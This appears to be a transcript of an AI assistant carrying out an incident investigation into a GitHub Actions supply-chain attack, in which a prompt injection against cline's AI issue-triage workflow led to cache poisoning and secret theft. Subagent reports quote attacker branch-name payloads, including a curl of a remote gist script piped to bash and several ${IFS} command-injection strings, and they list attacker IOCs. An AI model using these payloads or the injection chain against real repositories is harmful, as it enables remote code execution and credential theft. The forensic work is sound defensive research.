+<div class="tool-use" data-tool-id="toolu_018NX2Wv9gcVxKKvvinbNfkb"><div class="tool-header"><span class="tool-icon">⚙</span> Read</div><div class="truncatable"><div class="truncatable-content"><pre class="json">{
+  &#34;file_path&#34;: &#34;/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/forensic-report.md&#34;,
+  &#34;offset&#34;: 330,
+  &#34;limit&#34;: 30
+}</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T16-22-46-300Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T16-22-46-300Z" class="timestamp-link"><time datetime="2026-02-18T16:22:46.300Z" data-timestamp="2026-02-18T16:22:46.300Z">2026-02-18T16:22:46.300Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>   330→    },
+   331→    {
+   332→      &quot;type&quot;: &quot;workflow_file&quot;,
+   333→      &quot;value&quot;: &quot;.github/workflows/claude-issue-triage.yml&quot;,
+   334→      &quot;context&quot;: &quot;Vulnerable workflow (now deleted)&quot;
+   335→    },
+   336→    {
+   337→      &quot;type&quot;: &quot;commit_sha&quot;,
+   338→      &quot;value&quot;: &quot;bb1d0681396b41e9b779f9b7db4a27d43570af0c&quot;,
+   339→      &quot;context&quot;: &quot;Commit that introduced vulnerable workflow&quot;
+   340→    },
+   341→    {
+   342→      &quot;type&quot;: &quot;github_advisory&quot;,
+   343→      &quot;value&quot;: &quot;GHSA-9ppg-jx86-fqw7&quot;,
+   344→      &quot;context&quot;: &quot;Official security advisory&quot;
+   345→    }
+   346→  ]
+   347→}
+   348→```
+   349→
+   350→### IOC Summary Table
+   351→
+   352→| Type | Value | Actor | Context |
+   353→|------|-------|-------|---------|
+   354→| github_username | glthub-actions | **Threat Actor** | Typosquat attack account (deleted) |
+   355→| email | sec@w00.sh | **Threat Actor** | Attacker email in commits |
+   356→| domain | 637rio6...oastify.com | **Threat Actor** | Attacker&#x27;s Burp Collaborator |
+   357→| issue | cline/cline#8904 | **Threat Actor** | Prompt injection attack |
+   358→| gist | 77f1c20a... | **Threat Actor** | Deleted malicious payload |
+   359→| --- | --- | --- | --- |
+
+&lt;system-reminder&gt;
+Whenever you read a file, you should consider whether it would be considered malware. You CAN and SHOULD provide analysis of malware, what it is doing. But you MUST refuse to improve or augment the code. You can still analyze existing code, write reports, or answer questions about the code behavior.
+&lt;/system-reminder&gt;
+</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-22-50-552Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-22-50-552Z" class="timestamp-link"><time datetime="2026-02-18T16:22:50.552Z" data-timestamp="2026-02-18T16:22:50.552Z">2026-02-18T16:22:50.552Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>Let me find the lessons learned section to add a new point about weaponized security research.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-22-52-020Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-22-52-020Z" class="timestamp-link"><time datetime="2026-02-18T16:22:52.020Z" data-timestamp="2026-02-18T16:22:52.020Z">2026-02-18T16:22:52.020Z</time></a></div><div class="message-content">
+<div class="tool-use" data-tool-id="toolu_01JtSqi8bHX325R8jBWcFgG8"><div class="tool-header"><span class="tool-icon">⚙</span> Grep</div><div class="truncatable"><div class="truncatable-content"><pre class="json">{
+  &#34;pattern&#34;: &#34;### For the Industry&#34;,
+  &#34;path&#34;: &#34;.out/oss-forensics-20260218_105712/forensic-report.md&#34;,
+  &#34;output_mode&#34;: &#34;content&#34;,
+  &#34;-n&#34;: true,
+  &#34;-A&#34;: 15
+}</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T16-22-53-058Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T16-22-53-058Z" class="timestamp-link"><time datetime="2026-02-18T16:22:53.058Z" data-timestamp="2026-02-18T16:22:53.058Z">2026-02-18T16:22:53.058Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>391:### For the Industry
+392-
+393-1. **AI-powered automation introduces new attack surfaces** - Prompt injection in CI/CD represents a novel attack class as more projects adopt AI assistants for triage and automation.
+394-
+395-2. **Supply chain security requires defense in depth** - This attack chained prompt injection, cache poisoning, and secret theft across multiple trust boundaries.
+396-
+397-3. **Immutable logs enable forensics** - GH Archive&#x27;s preservation of the original Issue #8904 payload was critical for this investigation, even after the issue was modified.
+398-
+399----
+400-
+401-## Appendix: Evidence Summary
+402-
+403-### Evidence Statistics
+404-
+405-| Category | Count |
+406-|----------|-------|</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-22-55-985Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-22-55-985Z" class="timestamp-link"><time datetime="2026-02-18T16:22:55.985Z" data-timestamp="2026-02-18T16:22:55.985Z">2026-02-18T16:22:55.985Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>Now I can add a new lesson about weaponized security research.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-23-00-216Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-23-00-216Z" class="timestamp-link"><time datetime="2026-02-18T16:23:00.216Z" data-timestamp="2026-02-18T16:23:00.216Z">2026-02-18T16:23:00.216Z</time></a></div><div class="message-content"><div class="file-tool edit-tool" data-tool-id="toolu_01Fr7T1xmBwJMYfDvh4Mb8K5">
+<div class="file-tool-header edit-header"><span class="file-tool-icon">✏️</span> Edit <span class="file-tool-path">forensic-report.md</span></div>
+<div class="file-tool-fullpath">/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/forensic-report.md</div>
+<div class="truncatable"><div class="truncatable-content">
+<div class="edit-section edit-old"><div class="edit-label">−</div><pre class="edit-content">### For the Industry
+
+1. **AI-powered automation introduces new attack surfaces** - Prompt injection in CI/CD represents a novel attack class as more projects adopt AI assistants for triage and automation.
+
+2. **Supply chain security requires defense in depth** - This attack chained prompt injection, cache poisoning, and secret theft across multiple trust boundaries.
+
+3. **Immutable logs enable forensics** - GH Archive&#39;s preservation of the original Issue #8904 payload was critical for this investigation, even after the issue was modified.</pre></div>
+<div class="edit-section edit-new"><div class="edit-label">+</div><pre class="edit-content">### For the Industry
+
+1. **AI-powered automation introduces new attack surfaces** - Prompt injection in CI/CD represents a novel attack class as more projects adopt AI assistants for triage and automation.
+
+2. **Supply chain security requires defense in depth** - This attack chained prompt injection, cache poisoning, and secret theft across multiple trust boundaries.
+
+3. **Immutable logs enable forensics** - GH Archive&#39;s preservation of the original Issue #8904 payload was critical for this investigation, even after the issue was modified.
+
+4. **Security research can be weaponized** - This case demonstrates that threat actors monitor public security research and can weaponize PoCs before vendors patch. The 24-day gap between AdnaneKhan&#39;s public tests and glthub-actions&#39; attack shows how quickly adversaries can discover and exploit published research.</pre></div>
+</div><button class="expand-btn">Show more</button></div>
+</div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T16-23-00-530Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T16-23-00-530Z" class="timestamp-link"><time datetime="2026-02-18T16:23:00.530Z" data-timestamp="2026-02-18T16:23:00.530Z">2026-02-18T16:23:00.530Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>The file /Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/forensic-report.md has been updated successfully.</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-23-03-744Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-23-03-744Z" class="timestamp-link"><time datetime="2026-02-18T16:23:03.744Z" data-timestamp="2026-02-18T16:23:03.744Z">2026-02-18T16:23:03.744Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>Good. Now let me provide a summary to the user.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-23-08-147Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-23-08-147Z" class="timestamp-link"><time datetime="2026-02-18T16:23:08.147Z" data-timestamp="2026-02-18T16:23:08.147Z">2026-02-18T16:23:08.147Z</time></a></div><div class="message-content">
+<div class="assistant-text"><p>Report updated with corrected IOC attribution. Key changes:</p>
+<p><strong>IOCs now separated by actor:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Actor</th>
+<th>IOCs</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>glthub-actions (Threat Actor)</strong></td>
+<td><code>sec@w00.sh</code>, <code>637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com</code>, deleted gists, Issue #8904</td>
+</tr>
+<tr>
+<td><strong>AdnaneKhan (Researcher)</strong></td>
+<td><code>gcbrun</code>, <code>Dev11940518</code>, <code>ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com</code></td>
+</tr>
+<tr>
+<td><strong>Neutral (Vulnerability)</strong></td>
+<td><code>cline@2.3.0</code>, <code>claude-issue-triage.yml</code>, GHSA</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Key clarification added:</strong>
+- <code>ar5tlcjrqpbjviszpm6om1mm9df43wrl.oastify.com</code> is AdnaneKhan's research infrastructure (NOT threat actor)
+- <code>637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com</code> is glthub-actions' attack infrastructure</p>
+<p><strong>New lesson learned added:</strong></p>
+<blockquote>
+<p>"Security research can be weaponized - This case demonstrates that threat actors monitor public security research and can weaponize PoCs before vendors patch."</p>
+</blockquote>
+<p>Report location: <code>.out/oss-forensics-20260218_105712/forensic-report.md</code></p></div></div></div>
+<div class="message user" id="msg-2026-02-18T16-23-24-803Z"><div class="message-header"><span class="role-label">User</span><a href="#msg-2026-02-18T16-23-24-803Z" class="timestamp-link"><time datetime="2026-02-18T16:23:24.803Z" data-timestamp="2026-02-18T16:23:24.803Z">2026-02-18T16:23:24.803Z</time></a></div><div class="message-content">
+<div class="user-content"><p>a couple more thread to pull.
+- you spotted glthubactionstesting user who fits here in terms of both timeline and name pattern
+- looks like the confirmed attacker also forked newrelic/test-oac-repository and tried prompt injection payloads there. and the repo is 404 now? check what was that repo about. cold this be a second compromise?</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-23-29-880Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-23-29-880Z" class="timestamp-link"><time datetime="2026-02-18T16:23:29.880Z" data-timestamp="2026-02-18T16:23:29.880Z">2026-02-18T16:23:29.880Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>The user wants me to investigate two leads:
+1. The <code>glthubactionstesting</code> account - I mentioned it earlier as being created 2026-02-02, which is after glthub-actions' activity. Need to investigate if it's related.
+2. The newrelic/test-oac-repository - glthub-actions tested payloads there and it's now 404. Could this be another victim?</p>
+<p>Let me investigate both of these.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-23-30-316Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-23-30-316Z" class="timestamp-link"><time datetime="2026-02-18T16:23:30.316Z" data-timestamp="2026-02-18T16:23:30.316Z">2026-02-18T16:23:30.316Z</time></a></div><div class="message-content">
+<div class="assistant-text"><p>Good catches. Let me investigate both threads.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-23-35-528Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-23-35-528Z" class="timestamp-link"><time datetime="2026-02-18T16:23:35.528Z" data-timestamp="2026-02-18T16:23:35.528Z">2026-02-18T16:23:35.528Z</time></a></div><div class="message-content">
+<div class="tool-use" data-tool-id="toolu_01Qrvu9pLkWuW3KvnD7uvh73"><div class="tool-header"><span class="tool-icon">⚙</span> Task</div><div class="tool-description">Investigate glthubactionstesting account</div><div class="truncatable"><div class="truncatable-content"><pre class="json">{
+  &#34;subagent_type&#34;: &#34;oss-investigator-gh-archive-agent&#34;,
+  &#34;prompt&#34;: &#34;Investigate the glthubactionstesting account and its relationship to glthub-actions.\n\nWorking directory: .out/oss-forensics-20260218_105712\n\nContext: We identified glthub-actions as the threat actor. There&#39;s another account called glthubactionstesting created 2026-02-02 (after glthub-actions&#39; activity ended Jan 31).\n\nQueries:\n1. ALL events by actor.login = &#39;glthubactionstesting&#39; in 2026\n2. Check if glthubactionstesting interacted with any of the same repos as glthub-actions\n3. Look for any other accounts matching pattern &#39;glthub*&#39; or &#39;glt*&#39; that could be related\n4. Compare activity patterns between glthub-actions and glthubactionstesting\n\nWe need to determine if glthubactionstesting is:\n- A continuation of glthub-actions after account suspension\n- A copycat\n- Unrelated&#34;
+}</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-23-40-777Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-23-40-777Z" class="timestamp-link"><time datetime="2026-02-18T16:23:40.777Z" data-timestamp="2026-02-18T16:23:40.777Z">2026-02-18T16:23:40.777Z</time></a></div><div class="message-content">
+<div class="tool-use" data-tool-id="toolu_01MYCrcf5fiebnsUK1FpyQm9"><div class="tool-header"><span class="tool-icon">⚙</span> Task</div><div class="tool-description">Investigate newrelic/test-oac-repository</div><div class="truncatable"><div class="truncatable-content"><pre class="json">{
+  &#34;subagent_type&#34;: &#34;oss-investigator-gh-archive-agent&#34;,
+  &#34;prompt&#34;: &#34;Investigate newrelic/test-oac-repository - was this a second compromise target?\n\nWorking directory: .out/oss-forensics-20260218_105712\n\nContext: glthub-actions tested prompt injection payloads on newrelic/test-oac-repository on Jan 27, 2026. The repo is now 404.\n\nQueries:\n1. ALL events on repo.name = &#39;test-oac-repository&#39; or repo.full_name containing &#39;newrelic/test-oac-repository&#39; in 2026\n2. Look for any IssuesEvents, PullRequestEvents, or PushEvents by glthub-actions on this repo\n3. Check when the repo was deleted (if there&#39;s a DeleteEvent)\n4. Look for any other actors who interacted with this repo around the same time\n5. Search for any events mentioning &#39;oac&#39; or &#39;test-oac&#39; to find related repos\n\nQuestions to answer:\n- What was newrelic/test-oac-repository? (test repo for OpenTelemetry Auto-instrumentation?)\n- Did glthub-actions successfully exploit it?\n- Why was it deleted? Was it compromised?\n- Is NewRelic a second victim?&#34;
+}</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-23-45-248Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-23-45-248Z" class="timestamp-link"><time datetime="2026-02-18T16:23:45.248Z" data-timestamp="2026-02-18T16:23:45.248Z">2026-02-18T16:23:45.248Z</time></a></div><div class="message-content">
+<div class="tool-use" data-tool-id="toolu_01RpuQxY8cGiSYxgPMycxaA1"><div class="tool-header"><span class="tool-icon">⚙</span> Task</div><div class="tool-description">Check GitHub status of related accounts</div><div class="truncatable"><div class="truncatable-content"><pre class="json">{
+  &#34;subagent_type&#34;: &#34;oss-investigator-github-agent&#34;,
+  &#34;prompt&#34;: &#34;Check current status of accounts and repos related to the glthub-actions investigation.\n\nWorking directory: .out/oss-forensics-20260218_105712\n\nCheck via GitHub API:\n1. github.com/glthubactionstesting - get profile, creation date, repos, activity\n2. github.com/newrelic/test-oac-repository - check if it exists, if 404 note that\n3. Search NewRelic org for any repos matching \&#34;test-oac\&#34; or \&#34;oac-repository\&#34;\n4. Check github.com/glthub-actions again to confirm still 404\n5. Look for any other NewRelic repos that might have been targeted\n\nAlso check:\n- Are there any security advisories from NewRelic around Jan-Feb 2026?\n- Any public disclosure about NewRelic being targeted?&#34;
+}</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T16-35-15-298Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T16-35-15-298Z" class="timestamp-link"><time datetime="2026-02-18T16:35:15.298Z" data-timestamp="2026-02-18T16:35:15.298Z">2026-02-18T16:35:15.298Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>Now let me provide a summary of the current status.
+
+## GitHub API Status Check Summary
+
+### Account Status
+
+| Account/Resource | Status | Notes |
+|-----------------|--------|-------|
+| **glthubactionstesting** | **ACTIVE** | Created 2026-02-02T23:31:37Z. 0 repos, 0 gists, 0 activity. Dormant account. |
+| **glthub-actions** | **404 (Deleted/Suspended)** | Typosquat account used in attack. All repos/gists deleted with account. |
+| **newrelic/test-oac-repository** | **404 (Deleted)** | Target repo for test attack before cline. |
+| **Malicious gist (77f1c20a...)** | **404 (Deleted)** | r.sh payload gist, deleted with glthub-actions account. |
+
+### Key Findings
+
+1. **Two Related Accounts**: 
+   - `glthub-actions` (with hyphen) - The malicious typosquat, now 404
+   - `glthubactionstesting` (no hyphen) - Still exists, created 2026-02-02, completely dormant
+
+2. **Timeline**:
+   - 2026-01-27: glthub-actions forked newrelic/test-oac-repository, closed PR #74, created malicious branches
+   - 2026-02-02: glthubactionstesting account created (possibly related staging account?)
+   - 2026-02-17: glthub-actions attack on cline
+   - 2026-02-18: glthub-actions account now 404
+
+3. **No NewRelic Public Disclosure**: No security advisories or public statements found from NewRelic regarding this incident. The test-oac-repository was deleted but no official advisory exists.
+
+4. **No GHSA for glthub-actions**: The GitHub Security Advisory database has no entries specifically for this typosquat campaign (searches return 404).
+
+### Evidence Added
+
+Added 4 new evidence items to `/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/evidence.json`:
+- `github-user-glthubactionstesting-exists-20260218`
+- `github-user-glthub-actions-404-confirmed-20260218`
+- `github-gist-77f1c20a43be8f8bd047f31dce427207-404`
+- `github-repo-newrelic-test-oac-repository-404`</pre><pre>agentId: ace196d (for resuming to continue this agent&#x27;s work if needed)</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T16-43-42-063Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T16-43-42-063Z" class="timestamp-link"><time datetime="2026-02-18T16:43:42.063Z" data-timestamp="2026-02-18T16:43:42.063Z">2026-02-18T16:43:42.063Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>Now let me provide a summary of the investigation findings.
+
+---
+
+## GH Archive Investigation Summary: glthubactionstesting Account
+
+### Key Finding: No GH Archive Activity Found
+
+**Query Results:**
+- `glthubactionstesting` - **0 events** found in GH Archive for 2026
+- Exact name variants (`glthub-actions-testing`, `glthubactionstesting`, etc.) - **0 events** found
+
+### Related Accounts Discovered
+
+I found 4 accounts matching the `glthub*` pattern in 2026:
+
+| Account | Actor ID | Events | First Seen | Last Seen | Status |
+|---------|----------|--------|------------|-----------|--------|
+| `glthubb` | 47694506 | 12 | 2026-01-01 | 2026-02-07 | Unrelated (WatchEvent spam) |
+| `glthub-actions` | 256690727 | 35 | 2026-01-26 | 2026-01-31 | **Known threat actor** |
+| `GlthubtestABC` | 260599111 | 1 | 2026-02-10 | 2026-02-10 | Unrelated (single PublicEvent) |
+| `glthub-metrics` | 261355930 | 19 | 2026-02-13 | 2026-02-14 | **Potential successor** |
+
+### Analysis: glthub-metrics as Potential Successor
+
+**Timeline:**
+- `glthub-actions` activity: Jan 26 - Jan 31, 2026 (then stopped)
+- `glthub-metrics` activity: Feb 13 - Feb 14, 2026 (appeared 13 days later)
+
+**Behavioral Comparison:**
+
+| Attribute | glthub-actions | glthub-metrics |
+|-----------|----------------|----------------|
+| Active hours (UTC) | 0, 1, 2, 3, 4, 12, 19, 20 | 5, 6, 7 |
+| Event types | Fork, Push, PR, Issue, Comment | Fork, Push, PR, Create, Delete |
+| Target repos | cline/cline, newrelic/test-oac-repository | AztecProtocol/aztec-packages |
+| Repo overlap | - | **0 repos in common** |
+
+**Verdict: Likely Unrelated**
+- No overlapping repos targeted
+- Different activity hours (night vs early morning UTC)
+- Different targeting strategy (glthub-actions targeted cline; glthub-metrics targeted AztecProtocol)
+
+### Conclusion: glthubactionstesting Investigation
+
+**The account `glthubactionstesting` has NO public GitHub activity recorded in GH Archive.**
+
+Possible explanations:
+1. **Account never performed public actions** - The account may exist but has never forked, pushed, opened PRs/issues, or starred repos
+2. **Account only has private activity** - GH Archive only records public events
+3. **Account was created but suspended/deleted before any activity** - If suspended immediately, no events would be recorded
+4. **Name mismatch** - The exact account name may differ from `glthubactionstesting`
+
+### Evidence Collected
+
+64 events from glthub-pattern accounts stored in:
+- `/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/glthubactionstesting-investigation.json`
+- Also appended to `/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/evidence.json` (3051 total items)
+
+### Recommendations
+
+1. **Use GitHub API** to verify if `glthubactionstesting` account exists and when it was created
+2. **Check account suspension status** - GitHub may have suspended the account before it could perform public actions
+3. **Investigate `glthub-metrics`** - While behavioral patterns differ, the naming convention and timing (appearing after glthub-actions stopped) warrant further investigation via GitHub API</pre><pre>agentId: a948a63 (for resuming to continue this agent&#x27;s work if needed)</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T16-57-56-385Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T16-57-56-385Z" class="timestamp-link"><time datetime="2026-02-18T16:57:56.385Z" data-timestamp="2026-02-18T16:57:56.385Z">2026-02-18T16:57:56.385Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>Now I have all the evidence. Let me provide the final report.
+
+---
+
+## Investigation Report: newrelic/test-oac-repository
+
+### Summary
+
+**newrelic/test-oac-repository was a legitimate NewRelic test repository for their fork PR handling workflow (likely &quot;Open Architecture/Compliance&quot; or similar).** It was targeted by multiple security researchers testing prompt injection/command injection vulnerabilities in GitHub Actions workflows on January 26-27, 2026. The repo is now 404 (deleted).
+
+### Key Findings
+
+#### 1. Repository Purpose
+- **Created**: Before July 3, 2025 (earliest GH Archive event)
+- **Primary maintainer**: `pranav-new-relic` (NewRelic employee)
+- **Bot accounts**: `nr-developer-toolkit`, `github-actions[bot]`
+- **Purpose**: Test repository for fork PR handling workflows that auto-create preview branches
+
+#### 2. glthub-actions Activity on Jan 27, 2026
+
+| Time (UTC) | Event | Details |
+|------------|-------|---------|
+| 20:23:54 | PullRequestEvent (closed) | PR #74 with malicious branch name |
+| 20:24:30 | IssueCommentEvent | Comment: &quot;netlify build fork&quot; |
+| 20:57:16 | ForkEvent | Created glthub-actions/test-oac-repository |
+
+**Malicious PR #74 Head Branch:**
+```
+{curl,-sSFL,gist.githubusercontent.com/glthub-actions/77f1c20a43be8f8bd047f31dce427207/raw/8bf62c75378429e193a64f29c10b3283253310cf/r.sh}${IFS}|${IFS}bash
+```
+
+This is a bash array injection payload attempting to execute a remote script.
+
+#### 3. Other Security Researchers Testing Same Repo
+
+**bhtestacount123** (Jan 26, 2026):
+- PR #63: `hello&quot;;echo${IFS}--Hello--${IFS}runFile${IFS}&gt;&amp;2;${IFS}chmod${IFS}+x${IFS}myscript.sh;${IFS}./myscript.sh)&quot;#${IFS}`
+- PR #66: `$(${IFS}chmod${IFS}+x${IFS}myscript.sh;${IFS}./myscript.sh)`
+
+**r3s1l3n7** (Jan 27, 2026):
+- PR #68: Testing from main branch (benign)
+- Also tested many other repos including CrowdStrike, mermaid-js, actualbudget
+
+#### 4. Pattern Analysis
+
+These researchers appear to be **bug bounty hunters** testing repositories for GitHub Actions command injection vulnerabilities. The `${IFS}` technique bypasses space restrictions in branch names. All tested:
+- Repositories with automated fork PR handling
+- Workflows that interpolate branch names in shell commands
+
+#### 5. Was NewRelic Compromised?
+
+**Evidence suggests NO successful compromise:**
+- No WorkflowRunEvents from glthub-actions during the attack window (20:23-20:57 UTC)
+- PRs were all closed, not merged
+- The &quot;netlify build fork&quot; comment was likely a trigger command that failed
+- Repo deletion may have been precautionary or part of routine cleanup
+
+#### 6. Why Repo Is Now 404
+
+Possible reasons:
+1. **Security response**: NewRelic deleted it after discovering the injection tests
+2. **Test repo lifecycle**: Temporary test repo removed after workflow testing complete
+3. **HackerOne disclosure**: Researchers may have reported vulnerability, leading to cleanup
+
+### Evidence Collected
+
+- **16 events** from newrelic/test-oac-repository (Jan 2026)
+- **13 events** from glthub-actions total activity (Jan 27, 2026)
+- **Saved to**: `/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/evidence-newrelic-oac.json`
+
+### Relationship to Main Investigation
+
+glthub-actions tested injection payloads on newrelic/test-oac-repository **before** the AWS attack on February 17, 2026. This suggests:
+1. glthub-actions was actively hunting for vulnerable GitHub Actions workflows
+2. NewRelic was a reconnaissance/testing target
+3. The same techniques (branch name injection, remote script execution) were used
+
+### Recommendations
+
+1. **Check if NewRelic reported**: Contact NewRelic security team to confirm if they received/reported this
+2. **Analyze the gist payload**: The r.sh script URL may still be accessible
+3. **Cross-reference bhtestacount123 and r3s1l3n7**: These may be related accounts or coordinated testing
+
+---
+
+**Evidence file**: `/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/evidence-newrelic-oac.json`</pre><pre>agentId: a5a7555 (for resuming to continue this agent&#x27;s work if needed)</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-58-01-614Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-58-01-614Z" class="timestamp-link"><time datetime="2026-02-18T16:58:01.614Z" data-timestamp="2026-02-18T16:58:01.614Z">2026-02-18T16:58:01.614Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>The user is making two points:
+1. The injection in newrelic/test-oac-repository was in the branch name (not just issue titles) - this is a different technique than the cline attack
+2. Can we recover the deleted gists from glthub-actions using GistEvent in GH Archive?</p>
+<p>Let me investigate both. GH Archive does capture GistEvents, so we might be able to recover the contents or at least metadata of the deleted gists.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-58-02-366Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-58-02-366Z" class="timestamp-link"><time datetime="2026-02-18T16:58:02.366Z" data-timestamp="2026-02-18T16:58:02.366Z">2026-02-18T16:58:02.366Z</time></a></div><div class="message-content">
+<div class="assistant-text"><p>You're right - the branch name injection is a different technique. And yes, GH Archive captures GistEvents! Let me try to recover those deleted gists.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-58-11-306Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-58-11-306Z" class="timestamp-link"><time datetime="2026-02-18T16:58:11.306Z" data-timestamp="2026-02-18T16:58:11.306Z">2026-02-18T16:58:11.306Z</time></a></div><div class="message-content">
+<div class="tool-use" data-tool-id="toolu_019hJZG3HTEAm6S4zmdWtz7m"><div class="tool-header"><span class="tool-icon">⚙</span> Task</div><div class="tool-description">Recover deleted gists via GistEvent</div><div class="truncatable"><div class="truncatable-content"><pre class="json">{
+  &#34;subagent_type&#34;: &#34;oss-investigator-gh-archive-agent&#34;,
+  &#34;prompt&#34;: &#34;CRITICAL: Recover deleted gists from glthub-actions using GistEvent in GH Archive.\n\nWorking directory: .out/oss-forensics-20260218_105712\n\nThe threat actor glthub-actions (actor_id: 256690727) created gists containing malicious payloads (r.sh, run.sh). These gists are now deleted but GH Archive may have captured GistEvents.\n\nKnown deleted gist IDs:\n- 77f1c20a43be8f8bd047f31dce427207 (r.sh)\n- 7b3f87dac75ef2249adeb6bdbc9ee3f1 (run.sh)\n- 148eccfabb6a2c7410c6e2f2adee7889\n- 4f746a77ff66040b9b45c477d1be9295\n\nQuery:\n```sql\nSELECT *\nFROM `githubarchive.day.2026*`\nWHERE type = &#39;GistEvent&#39;\n  AND actor.login = &#39;glthub-actions&#39;\nORDER BY created_at\n```\n\nAlso try:\n```sql\nSELECT *\nFROM `githubarchive.day.2026*`\nWHERE type = &#39;GistEvent&#39;\n  AND actor.id = 256690727\nORDER BY created_at\n```\n\nGistEvents may contain:\n- Gist creation timestamps\n- Gist descriptions\n- File names within gists\n- Possibly file contents or snippets\n\nThis is critical evidence - the gist payloads would reveal what the attacker intended to execute.&#34;
+}</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T16-58-15-930Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T16-58-15-930Z" class="timestamp-link"><time datetime="2026-02-18T16:58:15.930Z" data-timestamp="2026-02-18T16:58:15.930Z">2026-02-18T16:58:15.930Z</time></a></div><div class="message-content">
+<div class="tool-use" data-tool-id="toolu_01WSsbNpK53BzgUt1RFjx4ZK"><div class="tool-header"><span class="tool-icon">⚙</span> Task</div><div class="tool-description">Recover gists via Wayback Machine</div><div class="truncatable"><div class="truncatable-content"><pre class="json">{
+  &#34;subagent_type&#34;: &#34;oss-investigator-wayback-agent&#34;,
